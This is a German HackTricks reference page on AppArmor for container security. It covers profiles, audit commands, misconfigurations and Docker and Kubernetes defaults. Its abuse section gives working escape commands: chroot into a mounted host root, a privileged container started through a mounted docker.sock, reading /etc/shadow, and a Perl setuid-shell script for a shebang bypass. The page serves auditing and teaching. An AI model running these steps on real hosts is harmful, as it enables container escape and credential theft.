# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Überblick

AppArmor ist ein System zur **obligatorischen Zugriffskontrolle**, das mithilfe von Profilen pro Programm Einschränkungen durchsetzt. Anders als herkömmliche DAC-Prüfungen, die stark von Benutzer- und Gruppenzugehörigkeit abhängen, ermöglicht AppArmor dem Kernel, eine direkt an den Prozess gebundene Richtlinie durchzusetzen. In Container-Umgebungen ist das wichtig, weil ein Workload möglicherweise über genügend herkömmliche Berechtigungen verfügt, um eine Aktion zu versuchen, und dennoch daran gehindert wird, weil sein AppArmor-Profil den betreffenden Pfad, das Mount-Verhalten, das Netzwerkverhalten oder die Verwendung bestimmter Capabilities nicht erlaubt.

Der wichtigste konzeptionelle Punkt ist, dass AppArmor **pfadbasiert** ist. Es beurteilt den Dateisystemzugriff anhand von Pfadregeln und nicht anhand von Labels wie SELinux. Das macht es zugänglich und leistungsstark, bedeutet aber auch, dass Bind-Mounts und alternative Pfadstrukturen sorgfältig betrachtet werden sollten. Wenn dieselben Host-Inhalte über einen anderen Pfad erreichbar werden, kann die Richtlinie anders wirken, als der Betreiber zunächst erwartet hat.

## Rolle bei der Container-Isolation

Sicherheitsüberprüfungen von Containern beschränken sich häufig auf Capabilities und seccomp, doch AppArmor bleibt auch nach diesen Prüfungen wichtig. Stell dir einen Container vor, der mehr Berechtigungen hat, als er haben sollte, oder einen Workload, der aus betrieblichen Gründen eine zusätzliche Capability benötigt. AppArmor kann den Dateizugriff, das Mount-Verhalten, das Netzwerk und Ausführungsmuster dennoch so einschränken, dass der offensichtliche Missbrauchsweg blockiert wird. Deshalb kann das Deaktivieren von AppArmor, „nur damit die Anwendung funktioniert“, eine lediglich riskante Konfiguration unbemerkt in eine aktiv ausnutzbare verwandeln.

## Lab

Um zu prüfen, ob AppArmor auf dem Host aktiv ist, verwende:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

Um zu sehen, unter welchem AppArmor-Profil der aktuelle Containerprozess läuft:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

Der Unterschied ist aufschlussreich. Im Normalfall sollte der Prozess einen AppArmor-Kontext anzeigen, der an das von der Laufzeit gewählte Profil gebunden ist. Im unconfined-Fall entfällt diese zusätzliche Einschränkungsebene.

Du kannst auch überprüfen, was Docker deiner Ansicht nach angewendet hat:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Laufzeitnutzung

Docker kann ein Standard- oder benutzerdefiniertes AppArmor-Profil anwenden, wenn der Host dies unterstützt. Podman kann AppArmor auf AppArmor-basierten Systemen ebenfalls integrieren, obwohl auf SELinux-zentrierten Distributionen oft das andere MAC-System im Vordergrund steht. Kubernetes kann AppArmor-Richtlinien auf Workload-Ebene auf Nodes bereitstellen, die AppArmor tatsächlich unterstützen. Auch LXC und verwandte System-Container-Umgebungen der Ubuntu-Familie verwenden AppArmor umfassend.

Der praktische Punkt ist, dass AppArmor kein „Docker-Feature“ ist. Es ist ein Host-Kernel-Feature, das verschiedene Runtimes anwenden können. Unterstützt der Host es nicht oder wird die Runtime angewiesen, ohne Einschränkungen zu laufen, ist der vermeintliche Schutz nicht wirklich vorhanden.

Für Kubernetes ist die moderne API `securityContext.appArmorProfile`. Seit Kubernetes `v1.30` sind die älteren Beta-AppArmor-Annotationen veraltet. Auf unterstützten Hosts ist `RuntimeDefault` das Standardprofil, während `Localhost` auf ein Profil verweist, das bereits auf dem Node geladen sein muss. Das ist bei Reviews wichtig, denn ein Manifest kann AppArmor berücksichtigen und dennoch vollständig von der Unterstützung durch den Node und vorab geladenen Profilen abhängen.<sup>[[1]](#references)</sup>

Ein subtiler, aber nützlicher operativer Aspekt: `appArmorProfile.type: RuntimeDefault` explizit festzulegen ist strenger, als das Feld einfach wegzulassen. Wird das Feld explizit gesetzt und unterstützt der Node AppArmor nicht, sollte die Admission fehlschlagen. Wird das Feld weggelassen, kann der Workload möglicherweise trotzdem auf einem Node ohne AppArmor laufen und erhält dann schlicht keine zusätzliche Schutzebene. Aus Sicht eines Angreifers ist das ein guter Grund, sowohl das Manifest als auch den tatsächlichen Zustand des Nodes zu prüfen.<sup>[[1]](#references)</sup>

Auf Docker-fähigen AppArmor-Hosts ist `docker-default` das bekannteste Standardprofil. Dieses Profil wird aus dem AppArmor-Template von Moby generiert und ist wichtig, weil es erklärt, warum manche auf Capabilities basierenden PoCs in einem Standard-Container trotzdem fehlschlagen. Grob gesagt erlaubt `docker-default` gewöhnliches Networking, verweigert Schreibzugriffe auf große Teile von `/proc`, verweigert den Zugriff auf sensible Bereiche von `/sys`, blockiert Mount-Operationen und schränkt ptrace so ein, dass es kein allgemeines Primitive zur Untersuchung des Hosts ist. Wenn man diese Ausgangslage versteht, kann man besser unterscheiden zwischen „der Container hat `CAP_SYS_ADMIN`“ und „der Container kann diese Capability tatsächlich gegen die Kernel-Schnittstellen einsetzen, die mich interessieren“.

## Profilverwaltung

AppArmor-Profile werden üblicherweise unter `/etc/apparmor.d/` gespeichert. Eine gängige Namenskonvention ersetzt Schrägstriche im Pfad der ausführbaren Datei durch Punkte. Ein Profil für `/usr/bin/man` wird beispielsweise üblicherweise als `/etc/apparmor.d/usr.bin.man` gespeichert. Das ist sowohl bei der Verteidigung als auch bei der Prüfung wichtig, denn sobald der Name des aktiven Profils bekannt ist, lässt sich die entsprechende Datei auf dem Host oft schnell finden.

Zu den nützlichen Verwaltungsbefehlen auf dem Host gehören:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

Der Grund, warum diese Befehle in einer Container-Sicherheitsreferenz wichtig sind, liegt darin, dass sie erklären, wie Profile tatsächlich erstellt, geladen, in den Complain-Modus versetzt und nach Änderungen an Anwendungen angepasst werden. Wenn ein Operator dazu neigt, Profile bei der Fehlersuche in den Complain-Modus zu versetzen und danach zu vergessen, die Durchsetzung wieder zu aktivieren, kann der Container in der Dokumentation geschützt wirken, sich in Wirklichkeit aber viel weniger restriktiv verhalten.

### Profile erstellen und aktualisieren

`aa-genprof` kann das Verhalten einer Anwendung beobachten und dabei helfen, interaktiv ein Profil zu erstellen:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` kann ein Profil-Template generieren, das später mit `apparmor_parser` geladen werden kann:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

Wenn sich die Binärdatei ändert und die Richtlinie aktualisiert werden muss, kann `aa-logprof` in den Logs gefundene Verweigerungen erneut abspielen und den Operator bei der Entscheidung unterstützen, ob sie zugelassen oder verweigert werden sollen:

```bash
sudo aa-logprof
```

### Protokolle

AppArmor-Verweigerungen sind häufig über `auditd`, syslog oder Tools wie `aa-notify` sichtbar:

```bash
sudo aa-notify -s 1 -v
```

Dies ist operativ und offensiv nützlich. Verteidiger verwenden es, um Profile zu verfeinern. Angreifer nutzen es, um herauszufinden, welcher genaue Pfad oder Vorgang verweigert wird und ob AppArmor die Sicherheitskontrolle ist, die eine Exploit-Kette blockiert.

### Die genaue Profildatei identifizieren

Wenn eine Runtime einen bestimmten AppArmor-Profilnamen für einen Container anzeigt, ist es oft hilfreich, diesen Namen der Profildatei auf der Festplatte zuzuordnen:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

Das ist besonders nützlich bei der Überprüfung auf Host-Seite, da es die Lücke zwischen „der Container gibt an, unter dem Profil `lowpriv` zu laufen“ und „die tatsächlichen Regeln befinden sich in dieser konkreten Datei, die geprüft oder neu geladen werden kann“ schließt.

### Besonders wichtige Regeln für die Prüfung

Wenn du ein Profil lesen kannst, solltest du dich nicht auf einfache `deny`-Zeilen beschränken. Mehrere Regeltypen beeinflussen maßgeblich, wie wirksam AppArmor gegen einen Container-Escape-Versuch ist:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: Das Ziel-Binary wird ohne Einschränkungen ausgeführt. Wenn ein erreichbarer Helper, eine Shell oder ein Interpreter mit `ux` erlaubt ist, solltest du das normalerweise als Erstes testen.
- `px` / `Px` und `cx` / `Cx`: Führt beim Exec Profilübergänge durch. Das ist nicht automatisch problematisch, sollte aber geprüft werden, da ein Übergang zu einem deutlich weniger restriktiven Profil als dem aktuellen führen kann.
- `change_profile`: Erlaubt einer Task, sofort oder beim nächsten Exec zu einem anderen geladenen Profil zu wechseln. Ist das Zielprofil schwächer, kann dies zum vorgesehenen Ausweg aus einer restriktiven Domain werden.
- `flags=(complain)`, `flags=(unconfined)` oder das neuere `flags=(prompt)`: Diese Flags sollten beeinflussen, wie sehr du dem Profil vertraust. `complain` protokolliert Verweigerungen, statt sie durchzusetzen, `unconfined` hebt die Grenze auf, und `prompt` hängt von einem Userspace-Entscheidungspfad statt von einer ausschließlich durch den Kernel erzwungenen Verweigerung ab.
- `userns` oder `userns create,`: Neuere AppArmor-Richtlinien können die Erstellung von User Namespaces kontrollieren. Wenn ein Container-Profil dies ausdrücklich erlaubt, bleiben verschachtelte User Namespaces möglich, selbst wenn die Plattform AppArmor als Teil ihrer Härtungsstrategie verwendet.

Nützlicher grep-Befehl auf dem Host:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Diese Art von Audit ist oft hilfreicher, als Hunderte gewöhnlicher Dateiregeln zu durchsuchen. Wenn ein Breakout davon abhängt, einen Helfer auszuführen, einen neuen Namespace zu betreten oder in ein weniger restriktives Profil zu wechseln, liegt die Antwort oft in diesen auf Übergänge ausgerichteten Regeln und nicht in den offensichtlichen Zeilen im Stil von `deny /etc/shadow r`.

## Fehlkonfigurationen

Der offensichtlichste Fehler ist `apparmor=unconfined`. Administratoren setzen dieses Flag oft beim Debuggen einer Anwendung, die fehlschlug, weil das Profil etwas Gefährliches oder Unerwartetes korrekt blockiert hatte. Bleibt das Flag in der Produktionsumgebung gesetzt, wurde die gesamte MAC-Schicht praktisch entfernt.

Ein weiteres subtiles Problem ist die Annahme, dass bind mounts harmlos sind, weil die Dateiberechtigungen normal aussehen. Da AppArmor pfadbasiert arbeitet, kann das Einbinden von Host-Pfaden unter alternativen Mount-Punkten zu Problemen mit den Pfadregeln führen. Ein dritter Fehler ist, zu vergessen, dass ein Profilname in einer Konfigurationsdatei wenig bedeutet, wenn der Host-Kernel AppArmor nicht tatsächlich durchsetzt.

## Missbrauch

Wenn AppArmor nicht mehr aktiv ist, funktionieren möglicherweise plötzlich zuvor eingeschränkte Vorgänge: das Lesen sensibler Pfade über bind mounts, der Zugriff auf Bereiche von procfs oder sysfs, die schwerer zugänglich sein sollten, das Ausführen von Mount-bezogenen Aktionen, sofern Capabilities und seccomp dies ebenfalls zulassen, oder der Zugriff auf Pfade, die ein Profil normalerweise verweigern würde. AppArmor erklärt oft, warum ein auf Capabilities basierender Breakout-Versuch auf dem Papier „funktionieren sollte“, in der Praxis aber trotzdem scheitert. Wird AppArmor entfernt, kann derselbe Versuch plötzlich erfolgreich sein.

Wenn du vermutest, dass AppArmor der Hauptgrund dafür ist, dass eine Path-Traversal-, bind-mount- oder Mount-basierte Missbrauchskette nicht funktioniert, solltest du zunächst vergleichen, was mit und ohne Profil zugänglich ist. Wenn beispielsweise ein Host-Pfad im Container eingebunden ist, prüfe zunächst, ob du ihn durchlaufen und auslesen kannst:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

Wenn der Container außerdem über eine gefährliche Capability wie `CAP_SYS_ADMIN` verfügt, gehört zu den praktischsten Tests die Prüfung, ob AppArmor Mount-Vorgänge oder den Zugriff auf sensible Kernel-Dateisysteme blockiert:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

In Umgebungen, in denen ein Host-Pfad bereits über einen bind mount verfügbar ist, kann der Verlust von AppArmor ein Nur-Lese-Problem zur Offenlegung von Informationen auch in direkten Zugriff auf Host-Dateien verwandeln:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

Der Zweck dieser Befehle ist nicht, dass AppArmor allein den Ausbruch ermöglicht. Vielmehr werden nach dem Entfernen von AppArmor viele missbräuchliche Dateisystem- und Mount-Pfade sofort testbar.

### Vollständiges Beispiel: AppArmor deaktiviert + Host-Root eingebunden

Wenn das Host-Root bereits unter `/host` in den Container eingebunden ist, kann das Entfernen von AppArmor einen zuvor blockierten Dateisystem-Angriffspfad in einen vollständigen Host-Escape verwandeln:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Sobald die Shell über das Host-Dateisystem ausgeführt wird, hat die Workload die Container-Grenze faktisch überwunden:

```bash
id
hostname
cat /etc/shadow | head
```

### Vollständiges Beispiel: AppArmor deaktiviert + Runtime-Socket

Wenn AppArmor rund um den Runtime-Status die eigentliche Barriere war, kann ein eingebundener Socket für einen vollständigen Escape ausreichen:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

Der genaue Pfad hängt vom Mount-Punkt ab, aber das Ergebnis ist dasselbe: AppArmor verhindert den Zugriff auf die Runtime-API nicht mehr, und über die Runtime-API kann ein Container gestartet werden, der den Host kompromittiert.

### Vollständiges Beispiel: Path-Based-Bypass von Bind-Mounts

Da AppArmor pfadbasiert arbeitet, wird derselbe Inhalt des Host-Procfs nicht automatisch geschützt, wenn er über einen anderen Pfad erreichbar ist und `/proc/**` geschützt wird:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

Die Auswirkungen hängen davon ab, was genau eingehängt wird und ob der alternative Pfad auch andere Kontrollen umgeht. Dieses Muster ist jedoch einer der deutlichsten Gründe dafür, AppArmor zusammen mit dem Mount-Layout statt isoliert zu betrachten.

### Vollständiges Beispiel: Shebang-Umgehung

AppArmor kann dem Pfad des ausgeführten Skripts statt dem in dessen Shebang genannten Interpreter ein Profil zuordnen. Wird umgekehrt der Interpreter direkt aufgerufen, kann das Profil des Interpreters ausgewählt werden. Ein [AppArmor-Maintainer beschreibt diesen Unterschied](https://bugs.launchpad.net/apparmor/+bug/1911431). Ein historisches Beispiel betraf ein Skript, dessen erste Zeile auf einen eingeschränkten Interpreter verweist:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

Das Beispiel ist lediglich ein möglicher Fall, in dem die Dateifähigkeit des Interpreters wirksam werden kann und das tatsächliche exec-Attachment des Skripts den Vorgang erlaubt. Prüfe die geladene Policy und das Prozesslabel, die Capability-Bounding-Set, `no_new_privs` und den `nosuid`-Status des Mounts; allein ein Profil-Dateiname oder ein Eintrag `cap_setuid+ep` beweist keinen nutzbaren Übergang. Interpreter-Ketten und alternative Ausführungspfade sollten gesondert geprüft werden.

## Prüfungen

Diese Prüfungen sollen schnell drei Fragen beantworten: Ist AppArmor auf dem Host aktiviert, ist der aktuelle Prozess eingeschränkt und hat die Runtime diesem Container tatsächlich ein Profil zugewiesen?

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Was hier interessant ist:

- Wenn `/proc/self/attr/current` `unconfined` anzeigt, profitiert der Workload nicht von der AppArmor-Einschränkung.
- Wenn `aa-status` anzeigt, dass AppArmor deaktiviert oder nicht geladen ist, ist jeder Profilname in der Runtime-Konfiguration größtenteils kosmetisch.
- Wenn `docker inspect` `unconfined` oder ein unerwartetes benutzerdefiniertes Profil anzeigt, ist das oft der Grund dafür, dass ein dateisystem- oder mountbasierter Missbrauchspfad funktioniert.
- Wenn `/sys/kernel/security/apparmor/profiles` das erwartete Profil nicht enthält, reicht die Runtime- oder Orchestrator-Konfiguration allein nicht aus.
- Wenn ein vermeintlich gehärtetes Profil Regeln wie `ux`, ein weit gefasstes `change_profile`, `userns` oder `flags=(complain)` enthält, ist die tatsächliche Sicherheitsgrenze möglicherweise deutlich schwächer, als der Profilname vermuten lässt.

Wenn ein Container aus betrieblichen Gründen bereits über erhöhte Berechtigungen verfügt, macht ein aktiviertes AppArmor oft den Unterschied zwischen einer kontrollierten Ausnahme und einem wesentlich umfassenderen Sicherheitsversagen aus.

## Laufzeit-Standardeinstellungen

| Runtime / Plattform | Standardzustand | Standardverhalten | Häufige manuelle Abschwächungen |
| --- | --- | --- | --- |
| Docker Engine | Auf AppArmor-fähigen Hosts standardmäßig aktiviert | Verwendet das AppArmor-Profil `docker-default`, sofern es nicht überschrieben wird | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Hostabhängig | AppArmor wird über `--security-opt` unterstützt, aber der genaue Standard hängt vom Host und der Runtime ab und ist weniger allgemeingültig als das dokumentierte Profil `docker-default` von Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Bedingter Standard | Wenn `appArmorProfile.type` nicht angegeben ist, gilt standardmäßig `RuntimeDefault`; dies wird jedoch nur angewendet, wenn AppArmor auf dem Node aktiviert ist | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` mit einem schwachen Profil, Nodes ohne AppArmor-Unterstützung |
| containerd / CRI-O unter Kubernetes | Abhängig von Node und Runtime | Häufig von Kubernetes unterstützte Runtimes unterstützen AppArmor, aber die tatsächliche Durchsetzung hängt weiterhin von der Node-Unterstützung und den Workload-Einstellungen ab | Wie in der Kubernetes-Zeile; die direkte Runtime-Konfiguration kann AppArmor auch vollständig umgehen |

Bei AppArmor ist die wichtigste Variable oft der **Host**, nicht nur die Runtime. Eine Profileinstellung in einem Manifest sorgt nicht für Einschränkungen auf einem Node, auf dem AppArmor nicht aktiviert ist.

## References

- [1] [Kubernetes-Sicherheitskontext: AppArmor-Profilfelder und Verhalten bei fehlender Node-Unterstützung](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Ubuntu-24.04-Manpage `apparmor.d(5)`: Exec-Übergänge, `change_profile`, `userns` und Profil-Flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
